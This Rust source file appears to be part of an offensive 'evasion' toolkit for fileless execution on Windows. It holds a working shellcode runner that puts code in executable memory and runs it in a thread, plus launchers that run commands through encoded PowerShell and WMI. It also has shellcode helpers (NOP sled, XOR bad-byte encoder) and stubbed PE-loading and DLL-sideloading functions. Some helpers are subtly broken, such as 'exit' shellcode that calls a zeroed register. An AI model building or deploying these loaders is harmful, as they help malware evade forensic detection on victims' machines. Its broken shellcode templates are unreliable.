//! Fileless Execution Module
//!
//! Provides memory-only execution techniques to avoid writing to disk:
//! - Shellcode execution via VirtualAlloc
//! - PE loading directly from memory
//! - Reflective execution patterns
//!
//! These techniques leave minimal forensic artifacts on disk.

use super::errors::EvasionError;

/// Execution result for fileless operations
#[derive(Debug, Clone)]
pub struct ExecutionResult {
    pub success: bool,
    pub exit_code: Option<u32>,
    pub method: String,
    pub error: Option<String>,
}

/// Shellcode runner for direct memory execution
pub struct ShellcodeRunner;

impl ShellcodeRunner {
    /// Check if shellcode execution is available
    pub fn is_available() -> bool {
        cfg!(target_os = "windows")
    }

    /// Execute shellcode from memory
    ///
    /// # Safety
    /// This is extremely dangerous and will execute arbitrary code.
    /// Only use with trusted shellcode for educational purposes.
    ///
    /// # Arguments
    /// * `shellcode` - Raw machine code to execute
    /// * `wait` - Whether to wait for completion
    ///
    /// # Returns
    /// Execution result or error
    pub unsafe fn execute_shellcode(
        _shellcode: &[u8],
        _wait: bool,
    ) -> Result<ExecutionResult, EvasionError> {
        #[cfg(target_os = "windows")]
        {
            Self::execute_shellcode_windows(_shellcode, _wait)
        }

        #[cfg(not(target_os = "windows"))]
        {
            Err(EvasionError::FilelessExec(
                "Shellcode execution is primarily available on Windows".to_string(),
            ))
        }
    }

    /// Execute shellcode in a new thread
    ///
    /// # Safety
    /// Executes arbitrary code in a new thread.
    pub unsafe fn execute_shellcode_threaded(
        _shellcode: &[u8],
    ) -> Result<ExecutionResult, EvasionError> {
        #[cfg(target_os = "windows")]
        {
            Self::execute_shellcode_threaded_windows(_shellcode)
        }

        #[cfg(not(target_os = "windows"))]
        {
            Err(EvasionError::FilelessExec(
                "Threaded shellcode execution is primarily available on Windows".to_string(),
            ))
        }
    }

    #[cfg(target_os = "windows")]
    unsafe fn execute_shellcode_windows(
        shellcode: &[u8],
        _wait: bool,
    ) -> Result<ExecutionResult, EvasionError> {
        use std::mem;
        use winapi::shared::minwindef::DWORD;
        use winapi::um::errhandlingapi::GetLastError;
        use winapi::um::handleapi::CloseHandle;
        use winapi::um::memoryapi::{VirtualAlloc, VirtualProtect};
        use winapi::um::processthreadsapi::{CreateThread, WaitForSingleObject};
        use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE};

        if shellcode.is_empty() {
            return Err(EvasionError::FilelessExec(
                "Shellcode cannot be empty".to_string(),
            ));
        }

        // Allocate executable memory
        let mem = VirtualAlloc(
            std::ptr::null_mut(),
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );

        if mem.is_null() {
            return Err(EvasionError::FilelessExec(format!(
                "VirtualAlloc failed: {}",
                GetLastError()
            )));
        }

        // Copy shellcode to allocated memory
        std::ptr::copy_nonoverlapping(
            shellcode.as_ptr(),
            mem as *mut u8,
            shellcode.len(),
        );

        // Execute shellcode in current thread
        let shellcode_fn = mem::transmute::<_, fn() -> u32>(mem);
        let exit_code = shellcode_fn();

        // Free memory
        winapi::um::memoryapi::VirtualFree(mem, 0, winapi::um::winnt::MEM_RELEASE);

        Ok(ExecutionResult {
            success: true,
            exit_code: Some(exit_code),
            method: "shellcode_direct".to_string(),
            error: None,
        })
    }

    #[cfg(target_os = "windows")]
    unsafe fn execute_shellcode_threaded_windows(
        shellcode: &[u8],
    ) -> Result<ExecutionResult, EvasionError> {
        use winapi::shared::minwindef::DWORD;
        use winapi::um::errhandlingapi::GetLastError;
        use winapi::um::handleapi::CloseHandle;
        use winapi::um::memoryapi::{VirtualAlloc, VirtualProtect};
        use winapi::um::processthreadsapi::{CreateThread, WaitForSingleObject};
        use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};

        if shellcode.is_empty() {
            return Err(EvasionError::FilelessExec(
                "Shellcode cannot be empty".to_string(),
            ));
        }

        // Allocate executable memory
        let mem = VirtualAlloc(
            std::ptr::null_mut(),
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );

        if mem.is_null() {
            return Err(EvasionError::FilelessExec(format!(
                "VirtualAlloc failed: {}",
                GetLastError()
            )));
        }

        // Copy shellcode to allocated memory
        std::ptr::copy_nonoverlapping(
            shellcode.as_ptr(),
            mem as *mut u8,
            shellcode.len(),
        );

        // Create thread to execute shellcode
        let h_thread = CreateThread(
            std::ptr::null_mut(),
            0,
            Some(std::mem::transmute(mem)),
            std::ptr::null_mut(),
            0,
            std::ptr::null_mut(),
        );

        if h_thread.is_null() {
            winapi::um::memoryapi::VirtualFree(mem, 0, winapi::um::winnt::MEM_RELEASE);
            return Err(EvasionError::FilelessExec(format!(
                "CreateThread failed: {}",
                GetLastError()
            )));
        }

        // Wait for thread to complete
        WaitForSingleObject(h_thread, winapi::shared::winbase::INFINITE);

        // Get exit code
        let mut exit_code: DWORD = 0;
        winapi::um::processthreadsapi::GetExitCodeThread(h_thread, &mut exit_code);

        CloseHandle(h_thread);
        winapi::um::memoryapi::VirtualFree(mem, 0, winapi::um::winnt::MEM_RELEASE);

        Ok(ExecutionResult {
            success: true,
            exit_code: Some(exit_code),
            method: "shellcode_threaded".to_string(),
            error: None,
        })
    }
}

/// Fileless PE loader - loads and executes PE files from memory
pub struct FilelessExecutor;

impl FilelessExecutor {
    /// Check if fileless execution is available
    pub fn is_available() -> bool {
        cfg!(target_os = "windows")
    }

    /// Load and execute a PE file entirely from memory
    ///
    /// This loads a PE executable into memory and executes it without
    /// writing it to disk.
    ///
    /// # Arguments
    /// * `pe_data` - Raw PE file bytes
    /// * `args` - Command line arguments for the executable
    ///
    /// # Safety
    /// Executes arbitrary code from memory.
    pub unsafe fn execute_pe_from_memory(
        _pe_data: &[u8],
        _args: &[&str],
    ) -> Result<ExecutionResult, EvasionError> {
        #[cfg(target_os = "windows")]
        {
            Self::execute_pe_from_memory_windows(_pe_data)
        }

        #[cfg(not(target_os = "windows"))]
        {
            Err(EvasionError::FilelessExec(
                "PE execution from memory is primarily available on Windows".to_string(),
            ))
        }
    }

    #[cfg(target_os = "windows")]
    unsafe fn execute_pe_from_memory_windows(
        pe_data: &[u8],
    ) -> Result<ExecutionResult, EvasionError> {
        use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS};

        if pe_data.len() < std::mem::size_of::<IMAGE_DOS_HEADER>() {
            return Err(EvasionError::FilelessExec(
                "Invalid PE file - too small".to_string(),
            ));
        }

        // Validate DOS header
        let dos_header = pe_data.as_ptr() as *const IMAGE_DOS_HEADER;
        if (*dos_header).e_magic != 0x5A4D {
            return Err(EvasionError::FilelessExec(
                "Invalid DOS header".to_string(),
            ));
        }

        // Get NT headers offset
        let nt_headers_offset = (*dos_header).e_lfanew as usize;
        if nt_headers_offset >= pe_data.len() {
            return Err(EvasionError::FilelessExec(
                "Invalid NT headers offset".to_string(),
            ));
        }

        let nt_headers = pe_data.as_ptr().add(nt_headers_offset) as *const IMAGE_NT_HEADERS;
        if (*nt_headers).Signature != 0x4550 {
            return Err(EvasionError::FilelessExec(
                "Invalid NT signature".to_string(),
            ));
        }

        // This is a simplified implementation
        // Full in-memory PE execution requires:
        // 1. Allocating memory for the image
        // 2. Copying headers and sections
        // 3. Performing relocations
        // 4. Resolving imports
        // 5. Setting up the execution environment
        // 6. Transferring control to the entry point

        // For safety, we return an error here
        // A full implementation would be very complex
        Err(EvasionError::FilelessExec(
            "Full PE execution from memory requires complex implementation - stub".to_string(),
        ))
    }

    /// Execute a payload using DLL sideloading
    ///
    /// DLL sideloading loads a malicious DLL alongside a legitimate
    /// executable that will load it.
    pub fn dll_sideloading(
        _legitimate_exe: &str,
        _malicious_dll: &[u8],
    ) -> Result<ExecutionResult, EvasionError> {
        // This requires file system operations, so it's not truly fileless
        // but it's a related technique
        Err(EvasionError::FilelessExec(
            "DLL sideloading requires file system - not implemented".to_string(),
        ))
    }

    /// Execute code using PowerShell from memory
    ///
    /// This uses PowerShell to execute code without touching disk.
    pub fn powershell_from_memory(
        _script: &str,
        _encoded: bool,
    ) -> Result<ExecutionResult, EvasionError> {
        #[cfg(target_os = "windows")]
        {
            use std::process::Command;
            
            let args = if _encoded {
                vec!["-EncodedCommand", _script]
            } else {
                vec!["-Command", _script]
            };

            let output = Command::new("powershell.exe")
                .args(&args)
                .output()
                .map_err(|e| EvasionError::FilelessExec(format!(
                    "Failed to execute PowerShell: {}",
                    e
                )))?;

            let exit_code = output.status.code().map(|c| c as u32);
            let success = output.status.success();

            Ok(ExecutionResult {
                success,
                exit_code,
                method: "powershell_memory".to_string(),
                error: if !success {
                    Some(String::from_utf8_lossy(&output.stderr).to_string())
                } else {
                    None
                },
            })
        }

        #[cfg(not(target_os = "windows"))]
        {
            Err(EvasionError::FilelessExec(
                "PowerShell execution is Windows-specific".to_string(),
            ))
        }
    }

    /// Execute using WMI (Windows Management Instrumentation)
    ///
    /// WMI can execute commands remotely or locally without spawning
    /// visible processes.
    pub fn wmi_execution(
        _command: &str,
    ) -> Result<ExecutionResult, EvasionError> {
        #[cfg(target_os = "windows")]
        {
            use std::process::Command;

            let wmi_query = format!("SELECT * FROM Win32_Process WHERE Name = 'cmd.exe'");
            
            let output = Command::new("wmic")
                .args(&["process", "call", "create", _command])
                .output()
                .map_err(|e| EvasionError::FilelessExec(format!(
                    "Failed to execute WMI: {}",
                    e
                )))?;

            let exit_code = output.status.code().map(|c| c as u32);
            let success = output.status.success();

            Ok(ExecutionResult {
                success,
                exit_code,
                method: "wmi_execution".to_string(),
                error: if !success {
                    Some(String::from_utf8_lossy(&output.stderr).to_string())
                } else {
                    None
                },
            })
        }

        #[cfg(not(target_os = "windows"))]
        {
            Err(EvasionError::FilelessExec(
                "WMI execution is Windows-specific".to_string(),
            ))
        }
    }

    /// Execute using .NET reflection (requires .NET runtime)
    ///
    /// Loads and executes .NET assemblies from memory using reflection.
    pub fn dotnet_reflection(
        _assembly_bytes: &[u8],
        _type_name: &str,
        _method_name: &str,
    ) -> Result<ExecutionResult, EvasionError> {
        // This would require embedding a .NET runtime or using CLR hosting
        // Very complex to implement from scratch
        Err(EvasionError::FilelessExec(
            ".NET reflection execution requires CLR hosting - not implemented".to_string(),
        ))
    }
}

/// Helper for generating common shellcode patterns
pub mod shellcode_helpers {
    /// Generate a NOP sled (useful for buffer overflow payloads)
    pub fn generate_nop_sled(length: usize) -> Vec<u8> {
        // x86/x64 NOP = 0x90
        vec![0x90; length]
    }

    /// Generate Windows x64 exit(0) shellcode
    pub fn generate_exit_shellcode() -> Vec<u8> {
        // x64: xor rcx, rcx; call ExitProcess
        // This is a minimal example - real shellcode would be more complex
        vec![
            0x33, 0xC9, // xor ecx, ecx
            0xFF, 0xD1, // call ecx (would need proper setup)
        ]
    }

    /// Generate a simple execve shellcode template (Linux x64)
    pub fn generate_execve_shellcode(path: &str) -> Vec<u8> {
        // This is a template - real implementation would need proper encoding
        // to avoid null bytes and bad characters
        let mut shellcode = Vec::new();
        
        // Push the path string onto the stack (reversed)
        let path_bytes = path.as_bytes();
        for chunk in path_bytes.rchunks(8) {
            let mut val: u64 = 0;
            for (i, &b) in chunk.iter().enumerate() {
                val |= (b as u64) << (i * 8);
            }
            shellcode.extend_from_slice(&val.to_le_bytes());
        }
        
        shellcode
    }

    /// Encode shellcode to avoid bad characters
    pub fn encode_shellcode(shellcode: &[u8], avoid: &[u8]) -> Vec<u8> {
        // Simple XOR encoding to avoid null bytes
        let mut encoded = Vec::with_capacity(shellcode.len());
        for &byte in shellcode {
            let encoded_byte = if avoid.contains(&byte) {
                byte ^ 0xFF
            } else {
                byte
            };
            encoded.push(encoded_byte);
        }
        encoded
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_availability_check() {
        // Should be true on Windows
        let available = ShellcodeRunner::is_available();
        assert!(available || cfg!(not(target_os = "windows")));
    }

    #[test]
    fn test_fileless_availability() {
        let available = FilelessExecutor::is_available();
        assert!(available || cfg!(not(target_os = "windows")));
    }

    #[test]
    fn test_empty_shellcode_rejected() {
        #[cfg(target_os = "windows")]
        unsafe {
            let result = ShellcodeRunner::execute_shellcode(&[], false);
            assert!(result.is_err());
        }
    }

    #[test]
    fn test_nop_sled_generation() {
        let sled = shellcode_helpers::generate_nop_sled(100);
        assert_eq!(sled.len(), 100);
        assert!(sled.iter().all(|&b| b == 0x90));
    }

    #[test]
    fn test_shellcode_encoding() {
        let shellcode = vec![0x00, 0x41, 0x42, 0x43];
        let avoid = vec![0x00];
        let encoded = shellcode_helpers::encode_shellcode(&shellcode, &avoid);
        
        // Null byte should be encoded
        assert_ne!(encoded[0], 0x00);
        // Other bytes should be unchanged
        assert_eq!(encoded[1], 0x41);
        assert_eq!(encoded[2], 0x42);
        assert_eq!(encoded[3], 0x43);
    }

    #[test]
    fn test_exit_shellcode_generation() {
        let shellcode = shellcode_helpers::generate_exit_shellcode();
        assert!(!shellcode.is_empty());
    }

    #[test]
    fn test_execve_shellcode_template() {
        let shellcode = shellcode_helpers::generate_execve_shellcode("/bin/sh");
        assert!(!shellcode.is_empty());
    }
}
